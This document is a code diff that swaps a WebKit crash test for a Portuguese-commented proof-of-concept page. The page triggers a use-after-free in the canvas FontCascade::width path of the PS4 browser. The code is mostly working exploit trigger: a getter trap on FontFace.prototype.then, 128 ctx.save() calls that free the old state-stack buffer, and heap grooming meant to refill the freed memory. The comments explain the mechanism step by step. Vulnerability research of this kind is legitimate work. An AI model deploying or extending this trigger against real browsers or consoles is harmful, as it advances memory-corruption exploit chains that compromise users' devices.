@@ -1,60 +1,176 @@
-<!doctype html>
-<meta charset="utf-8">
+
+
+    
+<!DOCTYPE html>
+<!--
+  POC: UAF em FontProxy via realloc de m_stateStack
+  ====================================================
+  Bug class  : Use-After-Free (CWE-416)
+  Alvo C++   : FontCascade::width() com 'this' dangling após
+                WTF::Vector<State>::append() realocar m_stateStack
+  Componente : CanvasRenderingContext2DBase::FontProxy /
+               CanvasRenderingContext2DBase::State (m_stateStack)
+  Versão alvo: libSceNKWebKit.sprx — AppleWebKit/605.1.15 (PS4 FW 13.x/14.x)
+
+  MECANISMO (igual aos 5 UAFs confirmados):
+  ------------------------------------------
+  Passo 1: Registra getter em FontFace.prototype.then
+  Passo 2: ctx.measureText(Cherokee) → font matching → face.loaded
+           thenable check (ES2015 §25.4.1.3.2 — [[Get]] de .then)
+  Passo 3: Getter dispara DENTRO de FontCascade::width() enquanto
+           'this' aponta para m_stateStack.last().font.m_font
+  Passo 4: ctx.save() × 128 → WTF::Vector doubling reallocations
+           → buffer antigo de m_stateStack liberado via fastFree()
+  Passo 5: Getter retorna undefined (não thenable)
+           FontCascade::width() continua com 'this' dangling → UAF
+
+  DIFERENÇA DOS 5 UAFS ANTERIORES:
+  ---------------------------------
+  - UAF_FontMetrics / UAF_CSSFontSelector: documento.fonts.add() →
+    invalida iterador de FontFaceSet → crash em CSSFontSelector
+  - ESTE POC: ctx.save() × N → invalida ponteiro 'this' dentro de
+    FontCascade::width() → crash ao acessar m_description/m_fonts
+
+  REFERÊNCIA:
+  -----------
+  Mesmo mecanismo descoberto na cadeia do commit 42b1e2aac2c7
+  (bug 321872 / rdar://182680798) —
+  "FontCascade::width takes a raw GlyphGeometryCache entry out of
+   that object [após fontsNeedUpdate] and writes the result back"
+  GlyphGeometryCache não existe no PS4 605.1.15, mas o 'this'
+  dangling em FontCascade::width() existe via m_stateStack realloc.
+
+  COMO RODAR:
+  -----------
+  Servir em servidor local ou carregar direto no browser do PS4.
+  Não requer recursos externos.
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>UAF FontProxy m_stateStack realloc</title>
+</head>
 <body>
 
-
- <script>
+  <script>
 (function(){const logElement=document.createElement('pre');logElement.id='debug-log';logElement.style.cssText='position: fixed; bottom: 0; left: 0; width: 100%; max-height: 220px; overflow-y: auto; background: rgba(0, 0, 0, 0.85); color: #ff5555; font-family: monospace; font-size: 11px; z-index: 999999; padding: 8px; box-sizing: border-box; margin: 0; border-top: 2px solid #ff0000; text-align: left; white-space: pre-wrap; word-break: break-all;';if(document.body){document.body.appendChild(logElement);}else{document.addEventListener('DOMContentLoaded',()=>document.body.appendChild(logElement));}function log(msg,color='#ff5555'){if(!logElement)return;const line=document.createElement('div');line.style.color=color;line.textContent=msg;logElement.appendChild(line);logElement.scrollTop=logElement.scrollHeight;}window.onerror=function(message,source,lineno,colno,error){log(`[ERRO JS] ${message}\n  -> ${source}:${lineno}:${colno}`);};window.addEventListener('error',function(event){const target=event.target;if(target&&(target.tagName||target===window)){const tagName=target.tagName?target.tagName.toLowerCase():'recurso';const sourceUrl=target.src||target.href||'desconhecido';log(`[FALHA RECURSO/${tagName}] Não foi possível carregar: ${sourceUrl}`,'#ffaa00');}},true);window.addEventListener('unhandledrejection',function(event){log(`[PROMISE REJECTION] ${event.reason}`);});['log','error','warn','info'].forEach(method=>{const original=console[method];console[method]=function(...args){original.apply(console,args);const text=args.map(arg=>{if(typeof arg==='object'){try{return JSON.stringify(arg);}catch(e){return '[Objeto Circular]';}}return arg;}).join(' ');let color='#ffffff';if(method==='error')color='#ff5555';if(method==='warn')color='#ffaa00';log(`[Console.${method}] ${text}`,color);};});log('[Debug Ativo]','#00ff00');})();
- </script>
-    
-<script src="resources/gc.js"></script>
+  </script>
 <script>
-const sheetsPerRound = 3;
-const childrenPerSheet = 9;
-const rounds = 3;
+'use strict';
 
-let css = "@media all {";
-for (let i = 0; i < childrenPerSheet; ++i)
-    css += " @media all { .a" + i + " { color: rgb(" + i + ", 7, 9) } }";
-css += " }";
+function trigger() {
 
-function makeRound()
-{
-    const styles = [];
-    for (let i = 0; i < sheetsPerRound; ++i) {
-        const style = document.createElement("style");
-        style.textContent = css;
-        document.head.appendChild(style);
-        styles.push(style);
+    // ----------------------------------------------------------------
+    // 1. Configurar FontFace — local() evita necessidade de servidor.
+    //    face.loaded inicializa m_promise internamente.
+    //    Sem isso, fulfillPromise() pode não ter o objeto Promise
+    //    configurado e pular o caminho que faz o thenable check.
+    // ----------------------------------------------------------------
+    var face = new FontFace('UAFFont', 'local(Helvetica)');
+    document.fonts.add(face);
+    void face.loaded;
+
+    // ----------------------------------------------------------------
+    // 2. Pressão de heap: 500 canvases com famílias únicas saturar
+    //    o font metrics cache (mesma estratégia do UAF_FontMetrics).
+    //    Aumenta a chance de o buffer liberado ser reutilizado com
+    //    dados de lixo antes do retorno de FontCascade::width().
+    // ----------------------------------------------------------------
+    var dummies = [];
+    for (var i = 0; i < 500; i++) {
+        var d = document.createElement('canvas');
+        d.width = 1;
+        d.height = 1;
+        d.getContext('2d').font = '10px "UAFDM' + i + '"';
+        dummies.push(d);
     }
 
-    const lists = [];
-    for (const style of styles) {
-        const children = style.sheet.cssRules[0].cssRules;
-        for (let i = 0; i < childrenPerSheet; ++i) {
-            const list = children[i].cssRules;
-            list.expando = 1;
-            lists.push(list);
+    // ----------------------------------------------------------------
+    // 3. Canvas principal — fonte com fallback chain que força matching
+    //    via UAFFont (Times não tem Cherokee U+13A0).
+    //    ctx.font = '10px Times, UAFFont' é o setup que coloca
+    //    FontCascade::width() na stack antes do thenable check.
+    // ----------------------------------------------------------------
+    var canvas = document.createElement('canvas');
+    canvas.width = 64;
+    canvas.height = 64;
+    document.body.appendChild(canvas);
+    var ctx = canvas.getContext('2d');
+    ctx.font = '10px "Times New Roman", UAFFont';
+
+    // ----------------------------------------------------------------
+    // 4. Getter trap em FontFace.prototype.then
+    //
+    //    Quando disparado:
+    //      - 'this' dentro de FontCascade::width() aponta para
+    //        m_stateStack[last].font.m_font (FontCascade)
+    //      - ctx.save() × 128 → m_stateStack.append(state())
+    //        → WTF::Vector doubling em cada boundary (1→2→4→8→...→256)
+    //        → cada doubling libera o buffer anterior via fastFree()
+    //      - Após o getter retornar, 'this' em FontCascade::width()
+    //        aponta para memória liberada → UAF nos acessos a membros
+    //
+    //    Guard de reentrância: fired = true previne recursão infinita
+    //    se o próprio ctx.save() disparar o getter novamente.
+    // ----------------------------------------------------------------
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function() {
+            if (fired) return undefined;
+            fired = true;
+
+            // m_stateStack inicia com size=1, capacity provavelmente 1.
+            // 1ª chamada: size=2, capacity=2 → realloc #1 (buffer antigo liberado!)
+            // 2ª chamada: size=3, capacity=4 → realloc #2
+            // ...
+            // 7ª chamada: size=128, capacity=128 → realloc #7
+            // Total de 7 reallocations, garantindo que o buffer original
+            // foi liberado no primeiro save().
+            for (var i = 0; i < 128; i++) {
+                ctx.save();
+            }
+
+            // Alocações C++ para aumentar a chance do buffer liberado
+            // ser preenchido com dados de lixo antes do retorno.
+            // document.createElement usa fastMalloc internamente.
+            var fills = [];
+            for (var j = 0; j < 32; j++) {
+                fills.push(document.createElement('span'));
+            }
+
+            return undefined; // não thenable — Promise resolve normalmente
         }
+    });
+
+    // ----------------------------------------------------------------
+    // 5. TRIGGER: Cherokee U+13A0 não está em Times New Roman.
+    //    WebKit itera o fallback chain até UAFFont.
+    //    Durante o font matching para UAFFont:
+    //      → face.loaded verificado para thenability
+    //      → [[Get]] face.then → getter dispara
+    //      → ctx.save() × 128 → m_stateStack realloc
+    //      → FontCascade::width() tem 'this' dangling
+    //      → UAF ao acessar this->m_fonts / this->m_description
+    // ----------------------------------------------------------------
+    var result = ctx.measureText('\u13A0');
+
+    // Se chegou aqui sem crash, tentar com fillText também
+    // (path ligeiramente diferente no C++ — drawTextUnchecked)
+    if (result) {
+        Object.defineProperty(FontFace.prototype, 'then', {
+            configurable: true,
+            get: function() { return undefined; }
+        });
+        ctx.fillText('\u13A0\u13A2\u13A4', 10, 32);
     }
-
-    for (const style of styles)
-        style.remove();
-
-    return lists;
 }
 
-let held = [];
-for (let round = 0; round < rounds; ++round) {
-    held.push(makeRound());
-    if (held.length > 2)
-        held.shift();
-    gc();
-}
-held = null;
-gc();
-
-document.write("PASS if no crash2");
+window.onload = function() {
+    // setTimeout garante que o maquinário de fontes está inicializado.
+    // Mesmo padrão do UAF_CSSSegmentedFontFace_fontRanges.html.
+    setTimeout(trigger, 0);
+};
 </script>
 </body>
 </html>
